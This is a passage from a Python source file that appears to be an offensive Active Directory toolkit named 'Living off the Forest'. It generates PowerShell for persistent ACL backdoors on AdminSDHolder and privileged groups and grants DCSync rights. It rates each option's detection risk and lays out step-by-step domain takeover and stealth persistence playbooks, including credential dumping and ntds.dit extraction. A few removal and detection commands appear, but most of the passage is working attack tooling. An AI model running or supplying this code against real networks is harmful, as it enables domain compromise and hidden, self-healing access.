                                        acl_right: ACLRight,
                                        domain: str) -> List[str]:
        """Generate commands to remove the backdoor"""
        
        return [
            "# Remove the ACL backdoor",
            "",
            f'$User = Get-ADUser "{target_user}"',
            f'$TargetDN = "..."  # Set based on target object',
            "",
            "$ACL = Get-Acl -Path \"AD:\\$TargetDN\"",
            "",
            "# Find and remove the ACE",
            "$ACL.Access | Where-Object { ",
            f'    $_.IdentityReference -match "{target_user}"',
            "} | ForEach-Object {",
            "    $ACL.RemoveAccessRule($_)",
            "}",
            "",
            "Set-Acl -Path \"AD:\\$TargetDN\" -AclObject $ACL",
            "",
            'Write-Host "[+] ACL backdoor removed" -ForegroundColor Green',
        ]
    
    def _generate_attack_path(self,
                               target_user: str,
                               target_object: TargetObject,
                               acl_right: ACLRight) -> List[str]:
        """Generate attack path explanation"""
        
        if acl_right == ACLRight.SELF_MEMBERSHIP:
            return [
                f"1. {target_user} has WriteProperty on {target_object.value}'s 'member' attribute",
                f"2. {target_user} adds themselves to {target_object.value}",
                f"3. {target_user} is now a member of {target_object.value}",
                "4. Full administrative access achieved"
            ]
            
        elif acl_right == ACLRight.FORCE_CHANGE_PASSWORD:
            return [
                f"1. {target_user} has 'Force Change Password' on {target_object.value}",
                "2. Reset any user's password without knowing the old one",
                "3. Authenticate as the target user",
                "4. Access resources as that user"
            ]
            
        elif acl_right in [ACLRight.DS_REPLICATION_GET_CHANGES, ACLRight.DS_REPLICATION_GET_CHANGES_ALL]:
            return [
                f"1. {target_user} has DCSync rights on the domain",
                "2. Request replication like a Domain Controller",
                "3. Extract all password hashes from AD",
                "4. Crack or pass-the-hash for any account"
            ]
            
        elif acl_right == ACLRight.GENERIC_ALL:
            return [
                f"1. {target_user} has GenericAll (full control) on {target_object.value}",
                "2. Can modify any attribute, reset passwords, add to groups",
                "3. If group: add self as member",
                "4. If user: reset password and authenticate"
            ]
            
        elif acl_right == ACLRight.WRITE_DACL:
            return [
                f"1. {target_user} has WriteDacl on {target_object.value}",
                "2. Modify the ACL to grant yourself more rights",
                "3. Grant GenericAll to yourself",
                "4. Now have full control over the object"
            ]
        
        return [f"1. {target_user} has {acl_right.value} on {target_object.value}"]
    
    def _calculate_detection_risk(self, 
                                   acl_right: ACLRight, 
                                   target_object: TargetObject) -> str:
        """Calculate detection risk level"""
        
        # High-risk combinations
        if target_object in [TargetObject.DOMAIN_ADMINS, TargetObject.ENTERPRISE_ADMINS]:
            if acl_right in [ACLRight.GENERIC_ALL, ACLRight.WRITE_DACL]:
                return "high"
        
        # DCSync is often monitored
        if acl_right in [ACLRight.DS_REPLICATION_GET_CHANGES, ACLRight.DS_REPLICATION_GET_CHANGES_ALL]:
            return "medium-high"
        
        # AdminSDHolder is very stealthy (propagates automatically)
        if target_object == TargetObject.ADMIN_SD_HOLDER:
            return "low"
        
        # Self-membership on groups is subtle
        if acl_right == ACLRight.SELF_MEMBERSHIP:
            return "low-medium"
        
        return "medium"
    
    def _generate_persistence_notes(self, target_object: TargetObject) -> str:
        """Generate persistence notes"""
        
        if target_object == TargetObject.ADMIN_SD_HOLDER:
            return """AdminSDHolder Persistence:
- ACLs on AdminSDHolder propagate to ALL protected accounts every 60 minutes
- Protected accounts: Domain Admins, Enterprise Admins, Schema Admins, etc.
- Even if defenders fix ACLs on groups, they'll be overwritten
- Must fix AdminSDHolder directly to remove backdoor
- Extremely persistent and hard to detect"""
        
        elif target_object == TargetObject.DOMAIN_ROOT:
            return """Domain Root DCSync Persistence:
- DCSync rights allow replication requests
- Can extract all hashes at any time
- Survives password changes (just re-extract)
- Detection: Monitor for non-DC replication requests
- Event ID 4662 with specific GUIDs"""
        
        return "Standard ACL backdoor - survives reboots, persists until ACL is modified"
    
    def generate_adminsd_holder_backdoor(self, 
                                          target_user: str,
                                          domain: str) -> Dict[str, Any]:
        """
        Generate AdminSDHolder backdoor - the most persistent ACL backdoor
        
        AdminSDHolder ACLs propagate to ALL protected accounts every 60 minutes.
        Even if defenders fix individual group ACLs, they'll be overwritten!
        """
        
        return {
            "backdoor_type": "AdminSDHolder",
            "description": """AdminSDHolder Backdoor:
            
The AdminSDHolder container is a special AD object that serves as a template
for ACLs on protected accounts. Every 60 minutes, the SDProp process copies
the ACL from AdminSDHolder to all protected accounts.

Protected accounts include:
- Domain Admins, Enterprise Admins, Schema Admins
- Administrators, Account Operators, Server Operators
- Print Operators, Backup Operators, Replicator
- krbtgt

By adding an ACE to AdminSDHolder, you create a backdoor that:
1. Automatically propagates to all privileged groups
2. Self-heals even if defenders remove ACEs from groups
3. Is rarely checked during incident response
""",
            "powershell_script": self._generate_full_acl_script(
                target_user, 
                TargetObject.ADMIN_SD_HOLDER, 
                ACLRight.GENERIC_ALL,
                domain
            ),
            "exploitation": [
                "# After 60 minutes (or force SDProp), you'll have GenericAll on:",
                "# - Domain Admins group",
                "# - Enterprise Admins group",
                "# - All other protected groups",
                "",
                "# Add yourself to Domain Admins",
                f'Add-ADGroupMember -Identity "Domain Admins" -Members "{target_user}"',
            ],
            "detection": [
                "# Check AdminSDHolder ACL",
                'Get-Acl "AD:\\CN=AdminSDHolder,CN=System,DC=..." | Select-Object -ExpandProperty Access',
                "",
                "# Look for non-default entries",
                "# Default: SYSTEM, Domain Admins, Enterprise Admins only",
            ],
            "persistence_level": "EXTREME - Self-healing every 60 minutes"
        }


class LivingOffTheForest:
    """
    Main class combining VSS Raider and ACL Backdoor capabilities
    """
    
    def __init__(self):
        self.vss_raider = ShadowCopyRaider()
        self.acl_manager = ACLBackdoorManager()
    
    def get_attack_playbook(self, scenario: str = "full_domain_takeover") -> Dict[str, Any]:
        """Generate attack playbook for various scenarios"""
        
        if scenario == "full_domain_takeover":
            return {
                "name": "Full Domain Takeover",
                "steps": [
                    {
                        "phase": "1. Initial Access",
                        "description": "Compromise a domain-joined workstation",
                        "techniques": ["Phishing", "Exploit", "Credential stuffing"]
                    },
                    {
                        "phase": "2. Privilege Escalation",
                        "description": "Escalate to local admin",
                        "techniques": ["Unquoted service paths", "DLL hijacking", "Token impersonation"]
                    },
                    {
                        "phase": "3. Credential Harvesting",
                        "description": "Extract cached credentials",
                        "techniques": ["Mimikatz", "LSASS dump", "SAM extraction"]
                    },
                    {
                        "phase": "4. Lateral Movement",
                        "description": "Move to Domain Controller",
                        "techniques": ["Pass-the-hash", "PSExec", "WinRM"]
                    },
                    {
                        "phase": "5. VSS Raider",
                        "description": "Extract ntds.dit using Shadow Copy",
                        "command": "Use generate_vss_commands(VSSMethod.DISKSHADOW)",
                        "benefit": "Get ALL domain hashes offline"
                    },
                    {
                        "phase": "6. ACL Backdoor",
                        "description": "Install persistent ACL backdoor",
                        "command": "Use generate_adminsd_holder_backdoor()",
                        "benefit": "Permanent access even after hash rotation"
                    }
                ]
            }
        
        elif scenario == "stealth_persistence":
            return {
                "name": "Stealth Persistence",
                "steps": [
                    {
                        "phase": "1. Identify Stale Account",
                        "description": "Find dormant service account or old user",
                        "command": "Get-ADUser -Filter {LastLogonDate -lt (Get-Date).AddMonths(-6)}"
                    },
                    {
                        "phase": "2. AdminSDHolder Backdoor",
                        "description": "Add GenericAll for stale account on AdminSDHolder",
                        "benefit": "Self-healing backdoor every 60 minutes"
                    },
                    {
                        "phase": "3. DCSync Rights",
                        "description": "Also add DCSync rights for remote access",
                        "benefit": "Extract hashes without touching DC"
                    }
                ]
            }
        
        return {"error": "Unknown scenario"}


# Flask Blueprint integration
try:
    from flask import Blueprint
    
    lotf_bp = Blueprint('lotf', __name__, url_prefix='/lotf-ad')
    
    @lotf_bp.route('/')
    def lotf_index():
        return "Living off the Forest - AD Module"
    
except ImportError:
    lotf_bp = None


if __name__ == "__main__":
    # Demo
    lotf = LivingOffTheForest()
    
    # Generate VSS extraction commands
    print("=== VSS Raider ===")
    vss_result = lotf.vss_raider.generate_vss_commands(VSSMethod.DISKSHADOW)
    print(f"Method: {vss_result['method']}")
    print(f"OPSEC Rating: {vss_result['opsec_rating']}")
    
    print("\n=== ACL Backdoor ===")
    acl_result = lotf.acl_manager.generate_acl_backdoor(
        target_user="stajyer_ahmet",
        target_object=TargetObject.DOMAIN_ADMINS,
        acl_right=ACLRight.SELF_MEMBERSHIP,
        domain="corp.local"
    )
    print(f"Detection Risk: {acl_result['detection_risk']}")
    print(f"Attack Path: {acl_result['attack_path']}")
